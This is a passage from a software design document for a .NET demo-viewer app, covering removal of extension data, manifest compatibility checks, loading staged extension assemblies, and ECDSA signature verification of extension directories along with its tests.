siblings under `cache/demos/`) is declared as `"demos/*<suffix>"`: the directory is listed once and the
suffix matched by ordinal string comparison in managed code, never handed to a filesystem glob, so it
cannot widen to match the core record sidecars beside it. Both of `PackDataRemover`'s public methods run
through `QueueWork.Run` on serial `ownerTag` (`QueueWork.RunAsync` has no serial parameter), so a delete
never overlaps the pack's own release item on the same serial.

`StratBookStores.All` is the pack's descriptor list, corrected against the real writers rather than this
section's original table: `grenade-lineups.json.gz` and `grenades-v3.attempts.json` are under the CACHE
root (`GrenadeLineupStore`/`GrenadeStoreMigration` both combine with `DemoCacheStore.CacheRoot`, never
`AppPaths.ConfigRoot`), and `review-queue.json` is dropped (the boundary rule keeps Review Queue core, shared
with Reels, live with the pack off; deleting it would take Reels' own queue with it). Facet ids for the
record strip are the pack's four evaluator ids (`StratBookDataRemoval.FacetIds`), not a separate list: a
`PackStamp.Id` is a facet, not a pack id, and the convention every writer follows is that a stamp always
rides with the payload it describes.

**Release path, as decided:** turn the pack off first, delete, leave it off. `StratBookDataRemoval.DeleteAsync`
writes the gate override off through `SettingsService.Write` (the same write the Extensions master switch
makes) and awaits `PackSwitch.Pending`. That wait is never stale: `FeatureGate.RaiseChanged` fires inline,
synchronously, for a self-write made from the UI thread, so by the time the override write returns,
`PackSwitch.Disable` has already queued the release and updated `Pending`. Only once that release has run
(residents dropped, the lineup flush and the signature cache's own write done) does the delete touch any
file, so nothing the release still owns is deleted out from under it. The alternative, calling a
lifecycle release directly and staying on, was not taken: it would need its own synchronization
with whatever queue item is draining the release, which `PackSwitch.Pending` already gives for free from
the existing switch-off path, with no new seam.

A re-check guards the gap `Pending` cannot: `DeleteAsync` reads `IsEnabled(PackFeatureId)` again right
after the wait, before calling the remover, and the remover itself evaluates a `stillOff` predicate inside
the queued job, right before it touches a file, so a re-enable landing between the wait and the job
actually running aborts cleanly on either side rather than deleting against a live pack.

**The blocker this surfaced:** `StratStore`, `TagStore`, `DossierNotesStore`, `VetoHistoryStore`,
`WatchedSituationsService` and `StratMiningService`'s state file are explicitly NOT released on disable
(section 3: "the pack's small user-truth stores... are not released"), so deleting their files while they stay
resident in memory would leave the deleted content on screen if the pack were re-enabled in the same
session, and the next edit would save it straight back. `DeleteAsync` closes this by calling each store's
own recovery after a successful delete: `StratStore.RebuildIndexFromDisk` and `TagStore.RebuildIndexFromDisk`
already existed (the lost-index recovery); `DossierNotesStore.Reload`, `VetoHistoryStore.Reload` and
`WatchedSituationsService.Reload` are new, each clearing exactly what the store's own `Load`/`Refuse` pair
already touches; `StratMiningService.ResetState` is new for the same reason, and matters more than the
others because `LoadState`'s own retry logic merges a fresh read with whatever is still in memory, which
would otherwise fold the deleted dismissed/promoted keys back in on the next attach. `TagPaletteStore.Reload`
and `ProfileStore.Reload` (both pre-existing) cover `palettes/` and `suggested-tags/` the same way.

### 2.5 Commands and keybindings

```csharp
public sealed record CommandDescriptor(
    string Id,                // "stratbook.step.add"; persisted override key
    string Label,
    string Scope,             // "playback2d", "playback2d.palette", "stratbook.canvas"
    KeyGesture? DefaultChord,
    Func<CommandContext, bool> Run,
    Func<CommandContext, bool>? CanRun = null);
```

`Run` returns `bool`, not `void`: the existing dispatch convention (`Playback2DTabViewModel.ExecuteAction`
returning false means unhandled, so the key falls through to whatever else wants it) has to survive
through a command, or a resolved key that does nothing would read as handled anyway.

Core `Playback2DAction` values map to command ids one to one, so persisted keybind overrides keep working.
The built ids equal the action's own enum name (not the `stratbook.step.add` style sketched
above), since that is what keeps a persisted `KeybindOverrides` row readable unchanged; check the actual
ids before copying the dotted style for a future pack. A command palette, if one
is ever built, reads the same registry.

### 2.6 How the gate folds in

- `pack.stratbook` is a `FeatureScope.Pack` descriptor with per-category defaults. Every Strat Book tab,
  section and sub-feature id gets `ParentId = "pack.stratbook"` (directly, or through its tab).
- The existing resolver order stays: Required, override, category default, group leader, then cascade up
  the parent chain. The only rule change is that a `Tab` may now have a parent, and only a `Pack`.
- "Plugin enabled" is exactly `IsEnabled("pack.stratbook")`. The category model keeps working: hiding the
  Strat Book from consumers by default, if ever wanted, is `Defaults(false, true, true)` on one id.
- Per-section overrides stay meaningful under an enabled pack (a user can hide Dossier and keep Strats).
- The gate becomes the one authority for background work too, not just visibility: evaluators and pack
  lifecycle read the same answer. That requires one new rule in the gate's contract: **a pack id never
  fails open.** An unknown `pack.*` id resolves off, so a typo cannot silently enable background work.

### 2.7 Manifest and compatibility

Everything here lives in the app under `DemoViewer.NET.Extensions` (`ExtensionHost.cs`) and
`DemoViewer.NET.Extensions.Manifest` (`SemVersion`, `VersionRange`, `ExtensionManifest`,
`ExtensionHostInfo`, `PackCompatibility`, `PackStatus`). Core references no extension; the extension
references these.

**The manifest.** `src/Extensions/StratBook/extension.json`, one file embedded in the extension assembly
under the logical name `extension.json` and copied beside the DLL on build (`None` with
`CopyToOutputDirectory`, which flows through every project reference, so a head's publish output and the
test binary's directory both carry it). The loader reads the on-disk copy before loading the
assembly; the pack reports the embedded copy in process through `IExtension.Manifest`.

```json
{
  "id": "net.demoviewer.pack.stratbook",
  "name": "Strat Book",
  "version": "{version}",
  "assembly": "DemoViewer.NET.Extensions.StratBook.dll",
  "entryType": "DemoViewer.NET.Extensions.StratBook.StratBookPack",
  "requiresHost": "^1.0",
  "requiresCs2DemoKit": "0.13.0-beta0001"
}
```

The committed file is a template (section 2.11): `"{version}"` is replaced at build with the version
Nerdbank.GitVersioning computes from `src/Extensions/StratBook/version.json`, and the stamped copy is what is
embedded and copied beside the DLL. The placeholder is not a semantic version on purpose, so an unstamped
copy fails to parse rather than load.

| Member | Required | Meaning |
|---|---|---|
| `id` | yes | The pack id; must equal `IExtension.Id` or the status is `ManifestInvalid`. Reverse-DNS, no whitespace. |
| `name` | yes | The user-facing name. |
| `version` | yes | The extension's own SemVer 2.0 version. Stamped at build from the extension's `version.json`; the committed template holds `{version}`. |
| `assembly` | yes | A bare `.dll` file name; a path is refused so a manifest cannot point outside its own directory. |
| `entryType` | yes | The full name of the `IExtension` type the loader instantiates. |
| `requiresHost` | yes | A range over `ExtensionHost.ContractVersion`. |
| `requiresCs2DemoKit` | yes | A range over `ExtensionHost.Cs2DemoKitVersion`. Exact by default: the extension uses CS2DemoKit types directly, so only the same version is known good. |
| `minAppVersion` | no | The oldest app release the extension runs on. |

Parsing is strict about the required members (absent, null or blank fails) and ignores members it does
not know, so a newer manifest loads on an older app, which judges it by the fields it understands.
Comments and trailing commas are accepted.

**Ranges.** `VersionRange` covers the npm syntax: comparator sets (`>=1.0.0 <2.0.0`), caret (`^1.0`:
same major, and below 1.0 same minor), tilde (`~1.2`: same minor), a bare version (exact, or an X-range
when partial: `1.2` is `>=1.2.0 <1.3.0`), `*` for any, and `||` between alternatives. A prerelease
satisfies a set only when a comparator in it names a prerelease of the same major.minor.patch, so
`^1.0` never admits `1.5.0-rc1` while `0.13.0-beta0001` matches itself exactly; `*` alone admits
everything, prereleases included, because a pre-1.0 CS2DemoKit is the normal case. Two ranges are equal
when written the same.

**The host.** `ExtensionHost` exposes three values and `Current` as one `ExtensionHostInfo`:

- `ContractVersion`, 1.0.0 today, a constant bumped by hand with the change that needs it. The contract is
  the surface a pack's own assembly references or implements, not every type under
  `DemoViewer.NET.Extensions`: host-side types that no pack touches (`Loading`, `CompatibilityReport`)
  change freely. **Major** on a breaking change to a type a pack does reference or implement, including
  `IModuleContext`, `IHostTabViewModel` or the `IPlaybackSurface` family: a removed or renamed member, a
  changed signature, a new abstract member on an interface a pack implements. **Minor** on an additive
  change: a new contribution kind, a new optional member with a default. Never patch; a contract has no
  behaviour of its own to fix. The pinning rule (section 4) adds a release rule on top: a **major** bump of the
  contract ships only with a major release of the app, so an extension built for one app major keeps
  loading on every later minor and patch of it.
- `AppVersion`, from `AppVersionInfo.CurrentReleaseVersion`; null on an unstamped build.
- `Cs2DemoKitVersion`, read at runtime from `CS2DemoKit.Analysis`'s informational version. NBGV stamps
  `0.13.0.1-beta0001+9f1e3e3b4a`; the fourth component and the metadata are dropped so the value equals
  the package version it was restored from. The assembly version is the fallback when the attribute is
  missing. The string is nowhere else in code: `ExtensionHostTests` pins the value to the
  `Directory.Packages.props` pin, so a bump that leaves the manifest behind fails a test, not a user.

**The check.** `PackCompatibility.Check(manifest, host)` returns `Compatible` or the first failing
reason, in this order: `HostContractMismatch(required, actual)`, `Cs2DemoKitMismatch(required, actual)`,
`AppTooOld(required, actual)`. An unstamped app skips the app-version check (a developer build, not an
old release). `PackStatus.Evaluate(pack, host)` wraps it for a configured pack and adds the two manifest
failures a check never sees: a `Manifest` getter that throws `ExtensionManifestException`, and a manifest
whose `id` is not the pack's; both read as `ManifestInvalid(reason)`. Nothing in the path throws for a bad
pack, since the point is to keep it out rather than take the app down with it.

**Where it runs.** Inside `FeaturePacks.Configure` (and `ConfigureIfUnset`): the head's list is judged as
it is set, and the frozen value is the list of `PackStatus`, so no reader can see a pack before its
verdict exists. The static exposes three views of that one value: `Default` (every declared pack, as
before), `Compatible` (the declared packs that passed) and `Statuses`. The composition root
(`App.BuildServices(windowService)`), `FeatureCatalog` (its lazy `Composed` fallback), `JobKindRegistry.Default`,
`CommandRegistry.Default`, the `ViewLocator`'s pack-assembly search and the shutdown flush loop all read
`Compatible`. So an incompatible pack never runs `Register` or `Contribute`, never puts a descriptor in
the catalog (the gate then reads its id as unknown and resolves it off, section 2.6), and never resolves
a view. This is the only point that is before every one of those readers: `FeatureCatalog.Composed` and
the two registries build from the static on first touch, which can happen before `BuildServices`, so a
check inside `BuildServices` would already be too late for them.

**The status surface.** Settings reads `FeaturePacks.Statuses` (injected, so tests and UiCapture pass a
fake). Every pack master row shows its manifest version beside the scope badge. A pack that failed has
no catalog row, so Settings synthesizes one from its status: a `FeatureScope.Pack` row named from the
manifest (or the pack id when the manifest did not parse), locked through the row's existing lock-hint
path (`incompatible`), the switch off and disabled, and the reason in user terms beneath the
description, for example "Strat Book 1.2.0 needs app contract ^2.0; this app provides 1.0.0". A stray
set of the row writes no override. The first-run wizard asks only about catalog packs, so an
incompatible extension is absent from its Extensions step. Copy says "extension", never "pack". The
UiCapture variant `settings-extensions-incompatible` renders the Strat Book row with its version and a
fake second extension in that state.

**The browser head** is unchanged: it compile-links the extension, the same check runs at configuration
and passes.

**The compatibility matrix test.** `CompatibilityMatrixTests`
(`src/App/DemoViewer.NET.App.Tests/Extensions/CompatibilityMatrixTests.cs`) is the release gate: it reads
the shipped manifest from the repo (walking to the filesystem root for `DemoViewer.NET.slnx`, no fixed
cap, since a release gate must fail loudly rather than skip when it cannot find its own repo), from the
copy beside the test binary, and from `new StratBookPack().Manifest` (the embedded copy the loader judges
the bundled pack by), asserting all three equal. It checks every axis against `ExtensionHost.Current`
separately rather than relying on `Check`'s single first failure, pins `requiresCs2DemoKit` to the
`Directory.Packages.props` pin exactly, and asserts `requiresHost` is bounded below the next major. A
table test pins `PackCompatibility.Check`'s semantics over representative host/manifest pairs.

**The reference check.** The extension's compiled `GetReferencedAssemblies()` is checked against the app
assembly's own transitive closure (loaded by simple name, minus the BCL), not a fixed list: the extension
references `CS2OpenDev.Sdk`, `CS2OpenDev.Protos`, `Google.Protobuf`, `DemoViewer.NET.Modules.Abstractions`
and `.Extensions.Sdk` directly, five of the eighteen non-BCL assemblies it references today, none
in this section's example families; a fixed list drawn from those families would have missed them. Every
one of the eighteen is app-shipped, so the private allowlist is empty today; the heads are deliberately not
walked, so a dependency only a head adds trips the exhaustiveness test instead of passing unnoticed. The
baseline is the test process's own dependency closure (what `dotnet test` restores), not the Desktop
head's publish output; section 2.8's `CheckReferences` below covers the loaded, published app. The check also sees
only the `AssemblyVersion` attribute (`0.13.0.0` for any `0.13.0-*` CS2DemoKit build), so a
prerelease-label drift is caught by the exact-pin assertion above, not by this one.

`CompatibilityReport.Describe` (`src/App/DemoViewer.NET/Extensions/Manifest/CompatibilityReport.cs`)
renders `Check`'s verdict and every value that fed it as one line, for the packaging step to print
and the updater to log. No pack references or implements it, so per the contract rule above it needs
no `ContractVersion` bump.

A contract bump (section 2.7's major/minor rule) must update `requiresHost` in `extension.json`, or
`RequiresHost_IsSatisfiedByTheCurrentContract_AndWouldBeViolatedByTheNextMajor` fails. A CS2DemoKit bump
must move all three `CS2DemoKit.*` pins in `Directory.Packages.props` and `requiresCs2DemoKit` in one
commit, or `RequiresCs2DemoKit_EqualsTheDirectoryPackagesPropsPin_Exactly` fails.

### 2.8 Loading

Everything here lives in the app under `DemoViewer.NET.Extensions.Loading` (`ExtensionLoader`,
`ExtensionCandidate`, `ExtensionLoadContext`, `ShippedPack`, `ITrustPolicy` and `TrustPolicy`,
`LoadOutcome` and `LoadFailure`) plus `PackSource` beside `PackStatus`. Only the Desktop head calls it;
the browser head, UiCapture and the test assembly still compile-link the pack and configure it as before.

**The directory.** A downloaded extension is staged under the config root, one directory per version:

```
<config root>/extensions/<id>/<version>/
  extension.json                            the manifest (section 2.7); id and version must equal the folder names
  DemoViewer.NET.Extensions.StratBook.dll   the assembly the manifest names
  extension.sig                             the detached signature (section 2.9) over everything else here
```

The loader reads only under `<config root>/extensions/`; it never writes, moves or deletes (staging and
cleanup belong to the updater). A directory, a manifest or an assembly that is a reparse point, or whose full path
resolves outside the extensions folder, is refused the way `PackDataRemover.ResolveSafe` refuses one
(`LoadFailure.PathEscapes`), never followed.

**The choice.** `ExtensionLoader.Resolve(configRoot, shipped, host, trust)` runs once in `Program.Main`,
after `VelopackApp.Build().Run()` and before Avalonia starts, and returns the `PackStatus` list that
`FeaturePacks.ConfigureResolved` takes. Per shipped pack:

1. `Discover` lists every `<id>/<version>/` whose manifest parses and whose folder names equal the
   manifest's id and version (`FolderMismatch` otherwise, `ManifestInvalid` for a missing or malformed
   file), ordered highest version first.
2. `Select` walks that pack's candidates from the top and takes the first that is **newer than the shipped
   version** (`NotNewer` otherwise; equal is not newer), that **`PackCompatibility.Check` accepts**
   (`Incompatible`, with the section 2.7 message), and that the **trust policy allows** (`Untrusted`).
   Every higher candidate it passed over is recorded with its reason; candidates below the chosen one are
   not examined.
3. `Load` loads the chosen assembly, resolves `entryType` by name (`EntryTypeMissing`), requires it to
   implement `IExtension` with a public parameterless constructor (`NotAPack`), constructs it, and
   checks that the pack's `Id` and the version of its embedded manifest equal the on-disk manifest
   (`IdentityMismatch`). A corrupt or missing file is `AssemblyLoadFailed`.
4. Two skew checks run on the loaded copy before it is accepted. `CheckReferences` compares every assembly
   the staged copy references against the version the default context runs (the loaded assembly's, else
   the file beside the app, read without loading; `System.*`, `netstandard` and `mscorlib` come from the
   shared runtime and are skipped): a difference is `ReferenceMismatch` ("it was built against SkiaSharp
   3.119.0.0; this app ships 3.116.1.0"). `Probe` then reads `Id`, `FeatureId`, `Manifest`, `Features`,
   `Commands` and `JobKinds` and runs `Register` on a scratch `ServiceCollection`, so a member compiled
   against a type or method the running app no longer has throws here, as `ProbeFailed` ("registering its
   services failed (TypeLoadException)"), rather than later in the composition root after the loader
   reported success. What the probe does not catch: anything compiled on first use, that is the bodies of
   the lambdas `Register` and `Contribute` hand the container, `Contribute` itself, the views and the view
   models. A staged copy that passes both can still fail lazily there; the reference check narrows that to
   packages whose assembly version does not move with the package version (CommunityToolkit.Mvvm stays
   8.0.0.0 across patches; NBGV stamps the first-party assemblies at major.minor, so a patch release of
   the app is invisible to it). The pinning rule (section 4) settled how much tighter to pin: (B), as built.
5. Anything that fails falls back to the shipped copy. The whole resolve is wrapped: a loader bug is a
   `LoaderFailed` outcome on the shipped pack, never a crash at startup.

Every `LoadOutcome.Detail` is in user terms and carries at most a bare file name, since Settings shows it;
the exception message behind it (which the runtime fills with the full path) rides on `LogDetail` and
reaches only the log line.

The shipped version comes from the `extension.json` the build copies beside the app
(`ShippedPack.BesideApp`), never from the type (see the constraint below). An unreadable shipped manifest
means no staged copy can be shown to be newer (`ShippedUnknown`), so the shipped copy runs. One shipped
extension per output directory for now: the copied file keeps the bare name `extension.json`, which a
second extension would collide with; renaming the copy to `<id>.extension.json` is still to do, as part
of packaging.

**The load context.** A staged copy loads into `ExtensionLoadContext`, a named (`extension:<id>@<version>`)
non-collectible `AssemblyLoadContext` whose `Load` returns null for everything, so every reference the
extension makes (the app assembly, Avalonia, CS2DemoKit) falls through to the default context and binds to
the copy the app runs on. Only the extension's own assembly lives in the child context. No unload: "off"
is the live-toggle switch (section 3).

This was not the first choice. The plan said "default context", and the simpler design is to load the
staged copy into `AssemblyLoadContext.Default` and skip it whenever the shipped assembly is already loaded.
A prototype against the built extension showed it cannot work: the shipped
`DemoViewer.NET.Extensions.StratBook.dll` is on the trusted platform assembly list (it is in the app
directory and the deps file), and `AssemblyLoadContext.Default.LoadFromAssemblyPath` of a same-named
assembly returns the TPA copy from the app directory, not the file named, whether or not it was loaded
before. The same prototype confirmed the other half of the trap: a method that merely mentions
`StratBookPack` on a branch not taken loads the shipped assembly when the JIT compiles the method.

**Constraints the child context imposes.**

- *Two assemblies of one name.* Once a staged copy wins, `DemoViewer.NET.Extensions.StratBook` may exist
  twice in the process: the staged one in its context, and the shipped one in the default context if
  anything resolves it by name. Nothing in the app should, but anything that does gets the shipped copy
  silently: `Assembly.Load`, `Type.GetType("..., DemoViewer.NET.Extensions.StratBook")`, and Avalonia's
  `avares://DemoViewer.NET.Extensions.StratBook/...` URIs (the asset loader resolves the authority by
  name). The extension has none of these today; `ExtensionLoaderTests.TheExtension_ResolvesNothingByAssemblyName`
  scans its source for them. The `ViewLocator` already reads `pack.GetType().Assembly`; DI, STJ, Avalonia
  properties and compiled XAML resolve by `Type`, which is the staged type.
- *The head must not name the type.* `Program.Main` passes the shipped pack as
  `ShippedPack.BesideApp(StratBookPack.PackId, static () => new StratBookPack())` (the id is a `const`,
  inlined by the compiler) and `BuildAvaloniaApp` uses `FeaturePacks.ConfigureIfUnset(static () => [...])`,
  so the only methods that mention the type are the two factories, compiled only when invoked: the loader's
  factory never when the staged copy wins, the previewer's never after Main. The shipped `StratBookPack`
  is then neither loaded, instantiated nor configured.
- *Dependencies come from the app.* A staged copy may reference only assemblies the app ships (the
  contract and CS2DemoKit ranges in its manifest cover the first-party ones); a new package reference in an
  extension release needs an app release that carries it, which the packaging and compatibility-matrix
  checks enforce.
- *Internals.* The app's `InternalsVisibleTo("DemoViewer.NET.Extensions.StratBook")` matches by simple name,
  so the staged copy sees the same internals the shipped one does.

**Trust.** `ITrustPolicy.Judge(directory, manifest)` is asked once per candidate, after the compatibility
check and before the assembly is touched; a policy that throws reads as untrusted. As built (section 2.9),
`TrustPolicy.Default` trusts a directory signed by one of `PublisherKeys.Current`, or,
failing that, the developer opt-in `DEMOVIEWER_EXTENSIONS_TRUST_UNSIGNED=1` set in the process
environment, which trusts every staged copy regardless of its signature. Nothing in the app or the
installer sets the variable; it is the documented way to run an unsigned local build.

**Logging.** The loader runs before any logger exists, so it records its outcome on each `PackStatus`
(`Source`, `Rejected`) and `App.axaml.cs` writes the report once the diagnostics pillar is up, under the
`App.Extensions` category: one line per pack, `Extension Strat Book 1.0.1 loaded (installed update) from
'<dir>'` or the incompatible form, then one `Staged extension at '<dir>' not loaded (<failure>): <detail>`
per refused candidate. It lands in the Diagnostics tab and the rolling `logs/diagnostics.log`.

**The Settings surface.** `PackStatus.Source` is `PackSource.Bundled` or `PackSource.Staged(directory)`,
with a user label ("bundled", "installed update") that the pack master row shows in parentheses after
the version: `1.0.1 (installed update)`. `PackStatus.Rejected` holds every staged candidate the loader
refused for that pack, newest first; the row shows one amber line per candidate beneath the description,
`Update 1.1.0 was not loaded: Strat Book 1.1.0 needs CS2DemoKit 0.14.0; this app ships 0.13.0-beta0001`
(or `An update in '<folder>' was not loaded: ...` when its manifest did not parse). Unlike the
incompatible row above, this locks nothing, since the copy that is running works. The UiCapture
variant `settings-extensions-staged` renders it. Copy says "extension" and "update", never "pack".

**Verified.** `ExtensionLoaderTests` copies the extension assembly this test process runs into a temp
`extensions/<id>/<version>/`, loads it, and asserts a second `Assembly` in an `ExtensionLoadContext` whose
pack contract type is the default context's; a manifest bumped over an unchanged assembly is an
`IdentityMismatch`; a corrupt file, a missing entry type and a non-pack entry type are reasons; a
symlinked folder or manifest is `PathEscapes`; and `Resolve` with a shipped manifest that says 0.9.0 loads
the 1.0.0 copy on disk without ever invoking the shipped factory. The published Desktop head
(`dotnet publish -c Release -r osx-arm64`) was run three times under temp config roots: with a staged
1.0.1 (the extension rebuilt with its manifest bumped) and the opt-in set, the log read `Extension Strat
Book 1.0.1 loaded (installed update) from '<root>/extensions/net.demoviewer.pack.stratbook/1.0.1'` and
the pack's index loads followed from the staged code; with nothing staged, `Strat Book 1.0.0 loaded
(bundled)`; with the same staged copy and no opt-in, `loaded (bundled)` followed by `Staged extension at
'<dir>' not loaded (Untrusted): the copy is not signed by this app's publisher`.

### 2.9 Signing and trust

Everything here lives in the app under `DemoViewer.NET.Extensions.Loading` (`ExtensionSignature`,
`PublisherKeys`, `SignedTrustPolicy`, and `TrustVerdict` and `TrustPolicy.SignedOrOptIn` beside
`ITrustPolicy`); a signing tool at `tools/extension-signing` links the first two files rather than
referencing the app.

**Algorithm.** ECDSA P-256 with SHA-256, not Ed25519. .NET 10's `System.Security.Cryptography` has no
standalone Ed25519 sign or verify: the only Ed25519-related surface is the composite
ML-DSA-with-Ed25519 hybrid tied to `MLDsa`, not a plain signer. `ECDsa` is the asymmetric signer the
runtime ships without pulling in a third-party package, so that is what this uses. Signatures use the
fixed-length IEEE P1363 encoding
(`DSASignatureFormat.IeeeP1363FixedFieldConcatenation`), 64 bytes for P-256, never the DER form, so the
byte length alone is a cheap sanity check.

**The canonical digest** (`ExtensionSignature.ComputeDigest`). Every file under the staged directory,
recursive, except a top-level `extension.sig`, hashed with SHA-256 in one deterministic order:

1. An 8-byte little-endian file count.
2. Per file, ordinal by its `/`-separated relative path (never the OS separator, so the same tree
   hashes the same on Windows and on macOS/Linux): an 8-byte little-endian length and the path's UTF-8
   bytes, then an 8-byte little-endian length and the file's content bytes.

Both lengths are prefixed, not just the content's, because a bare concatenation of variable-length
fields is ambiguous (`"ab"` then `"c"` hashes the same as `"a"` then `"bc"` without one). The walk is
manual, never `Directory.EnumerateFiles(..., AllDirectories)`: every entry, file or directory, is
checked for a reparse point before it is used, and refused (`ExtensionSignatureException`) rather than
followed, matching the loader's own rule for the staged folder one level up. `EnumerationOptions` sets
`AttributesToSkip = 0`; the default skips `Hidden`, and .NET marks a Unix dotfile `Hidden`, so leaving
the default in place would let an added dotfile hide from the digest. It also sets
`IgnoreInaccessible = false`: that property defaults to true, which silently skips an entry the process
cannot read instead of throwing, exactly the gap that would let part of a tampered tree go unhashed
with no reason at all; with it off, an unreadable file or directory anywhere in the tree is a reason,
not a silent omission, and the enumeration itself (not only the per-entry attribute read after it) is
inside the same guard, since it can throw mid-walk, a directory disappearing or a permission revoked
under it, not only at the first call. The walk also refuses more than `MaxFiles` (2000) files or more
than `MaxTotalBytes` (512 MB) total content, checked from `FileInfo.Length` before a file is opened, so
a tree that is too big to safely hash fails fast rather than streaming hundreds of megabytes first.
This is the form the release workflow's packaging step must reproduce byte for byte; nothing about it is specific to this
tool, and the tool and the app compile the identical source file (see below), so there is only one
implementation to keep in sync.

**`extension.sig`** is JSON beside `extension.json`:

```json
{
  "alg": "ECDSA-P256-SHA256",
  "keyId": "<lowercase hex, SHA-256 of the signer's SubjectPublicKeyInfo DER>",
  "digest": "<base64, the 32-byte canonical digest at signing time>",
  "signature": "<base64, the 64-byte IEEE P1363 signature>"
}
```

The JSON encoding itself needs no cross-tool agreement; only the signed message does. The signature is
over a fixed ASCII domain tag (`"DemoViewer.NET extension signature v1"`) followed by the digest bytes,
never the bare digest, so this key is never asked to verify some other 32-byte message as if it were
this one.

**Verification order matters.** `ExtensionSignature.Verify(directory, publisherKeysBase64Spki)`:

1. Missing `extension.sig` → `Missing`, detail "the copy is not signed by this app's publisher".
2. Not valid JSON, or a required field missing or not valid base64 → `Malformed`, detail "signature
   invalid".
3. `keyId` matches none of the given keys → `UnknownKey`, detail "the copy is not signed by this app's
   publisher" (collapsed with `Missing`: from the app's side, a key it does not recognize is the same
   fact as no signature at all).
4. The signature does not verify against the matched key, over the **recorded** digest → `SignatureInvalid`,
   detail "signature invalid".
5. Only once the signature has verified does `Verify` recompute the digest from the directory as it is
   now and compare; a mismatch → `DigestMismatch`, detail "a file changed after signing". A cap exceeded
   or a link found during that recompute reads the same way, since signing enforces the identical caps
   and refusals, so a tree that trips one now could not have been the one that was signed.

The order is load-bearing: the recorded digest inside `extension.sig` is attacker-controlled data until
the signature over it verifies, so nothing compares it to the live directory before that. This also
means a wrong key and a changed file are handled as two different buckets (steps 3 and 5), never
conflated into one ambiguous "didn't verify". The two are genuinely distinguishable here because the
signature names the key it claims, not because the math alone could tell them apart.

Every failure path is a `SignatureCheck`, never an exception; `ComputeDigest` itself throws
`ExtensionSignatureException` (a cap, a link, or an I/O error), and `Verify` catches that case by case
rather than letting it escape. `Verify` never throws.

**The app's seam.** `ITrustPolicy` gained a second, default-implemented member,
`TrustVerdict Judge(directory, manifest)`. No pack references or implements anything under
`Extensions.Loading` (the compatibility matrix test names `Loading` explicitly as a host-side area that "changes freely"),
so per the contract rule in section 2.7 this needs no `ContractVersion` bump, the same reasoning
`CompatibilityReport.Describe` above it relies on. `IsTrusted` is unchanged, so every policy written
before this still compiles and reports the one generic reason it always gave; `ExtensionLoader.Select`
now calls `Judge`, not `IsTrusted`, and copies its `Reason`/`LogDetail` onto the `Untrusted` `LoadOutcome`.

`SignedTrustPolicy(publicKeysBase64Spki = null)` calls `ExtensionSignature.Verify` against
`PublisherKeys.Current` by default, or an injected list for a test. `TrustPolicy.Default` is
`SignedOrOptIn(PublisherKeys.Current, <the real environment>)`: signed trust first, the developer opt-in
second, and on a full refusal the reported reason is the **signing** failure's, not "the opt-in wasn't
set", since that is the one a user or the log can act on. Neither key parsing nor a file read happens
at type load: `PublisherKeys.Current` is a plain list of base64 strings, and both policies underneath
`Default` are only ever asked inside the loader's own try/catch, so a bad embedded key constant cannot
fail the process at startup, only that one candidate at judge time. The opt-in itself still does not
look at the directory at all, signed or not: setting `DEMOVIEWER_EXTENSIONS_TRUST_UNSIGNED=1` bypasses
even a directory signed by a key this build does not know, exactly as it bypassed an unsigned one
before signing existed. That is unchanged from the loader's original behavior and is why the variable is
documented as a developer bypass, not a narrower "only when truly unsigned" rule.

**`PublisherKeys`.** SubjectPublicKeyInfo, base64, one constant (`Primary`) today, in a list
(`Current`) so rotation adds a key ahead of retiring one: a signature verifies if any listed key
verifies it. The public key in this repo today has key id
`dfe4ae3ebb28794fb79a03562ad36eaf252ebe1753292574e752bad4bc1c4cc0`, generated 2026-10-03.

**The signing tool**, `tools/extension-signing` (out of the `.slnx`, a CI and command-line utility rather than an
app component, following the `NavPathSpike` convention of a comment saying so plus relaxed analyzer
settings):

```
extension-signing keygen --out <private.pem>              generates an ECDSA P-256 key pair; the
                                                           private key is created at <private.pem>
                                                           already mode 600 off Windows (the create
                                                           mode is set on the open, not chmod'd after),
                                                           and the public half prints as a
                                                           PublisherKeys.cs constant plus its key id
extension-signing sign <dir> --key <private.pem> [--force] writes <dir>/extension.sig; refuses to
                                                           overwrite one that is already there
                                                           unless --force is given
extension-signing verify <dir>                            checks <dir>/extension.sig against
                                                           PublisherKeys.Current
```

`<AssemblyName>` is `extension-signing`, so a publish produces that binary name; from source,
`dotnet run --project tools/extension-signing -c Release -- <command> ...` runs the same thing.

It links `Extensions/Loading/ExtensionSignature.cs` and `PublisherKeys.cs` from the app via MSBuild
`<Compile Include="..." Link="..."/>`, not a project reference, so the tool and the app run the exact
same digest and verify code without pulling Avalonia into a CI utility, and there is one implementation
to keep correct rather than two to keep in sync. Verified by hand (2026-10-03): signed a staged
directory with a freshly generated key, verified it clean, then independently reproduced each of the
four failure buckets (missing, malformed, wrong key, one byte flipped after signing) against the real
tool and the real embedded key.

**Action before the first release.** The matching private key is not in this repo, not even on a branch that stays
unpushed: it was generated with `keygen` and written to a path under a home directory, outside
every git working tree, with owner-only permissions. Before the release workflow signs the shipped
extension automatically, store that private key's PEM contents as the
GitHub repository secret `DV_EXTENSION_SIGNING_KEY`, the same pattern the existing `DV_SIGN_*` /
`DV_NOTARY_PROFILE` secrets already use in `release.yml` (unset today; wired via repo secrets before that
release). Rotating the key is `keygen` again, adding the new public constant to
`PublisherKeys.Current` ahead of removing the old one (so an extension signed with the old key still
loads until every shipped build has the new constant), then updating the stored secret once releases
move to the new key.

**What the updater must not leave behind.** Because the digest covers the whole tree, nothing may land in
`<id>/<version>/` beside the files `extension.sig` actually signs: no staging marker, no temp file left
over from an interrupted download, no `.DS_Store`, no `__MACOSX/` from a zip extracted on macOS. Any of
those reads as "a file changed after signing" by construction, since it was never part of what was
hashed. Its staging step must write the signed files and nothing else into the version directory,
or clean up anything it used to get them there before the loader ever sees it.

**Tests.** `src/App/DemoViewer.NET.App.Tests/Extensions/ExtensionSignatureTests.cs`: sign-then-verify
round trip with a key generated in process; a byte change, a rename, an added file, a removed file, and
a wrong key each fail with the detail named above; a forged digest (rewritten to match a tampered tree)
and a spoofed key id (naming a key that never signed anything) both still fail, since the order of
checks never compares digests before the signature over them verifies; a listed key on another curve
(P-384) is skipped rather than handed to `VerifyData`; a subdirectory made unreadable mid-walk (chmod
000, skipped on Windows and under an account that can read it anyway) is a reason, never a thrown
exception, both through `ComputeDigest` directly and through `Verify`; the canonical digest is identical
across two runs and independent of the files' creation order; a dotfile changes the digest; both caps
are enforced; a symlinked file inside the tree is refused. `SignedTrustPolicyTests.cs`: a missing
signature is untrusted with the generic reason; a valid one is trusted; `Default` itself (not just
`SignedOrOptIn` with an injected key) refuses a directory signed with a key outside
